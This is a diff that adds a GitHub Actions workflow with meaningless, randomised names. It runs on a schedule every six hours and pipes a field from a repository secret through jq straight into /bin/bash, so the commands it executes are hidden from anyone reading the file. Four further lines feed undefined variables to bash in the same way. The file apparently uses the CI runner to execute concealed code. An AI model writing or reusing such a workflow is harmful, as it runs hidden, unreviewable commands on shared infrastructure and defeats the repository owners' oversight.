@@ -1,0 +1,21 @@
+name: hukaljx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hukaljx
+        env:
+          lug791: ${{ secrets.lug791 }}
+        run: |
+          echo $lug791 | jq -r .lvqpt4 | /bin/bash
+          echo $jeby062 | jq -r .w02 | /bin/bash
+          echo $i83 | jq -r .zag1 | /bin/bash
+          echo $gyyun842 | jq -r .z01322 | /bin/bash
+          echo $wa46 | jq -r .rnz60075 | /bin/bash
+
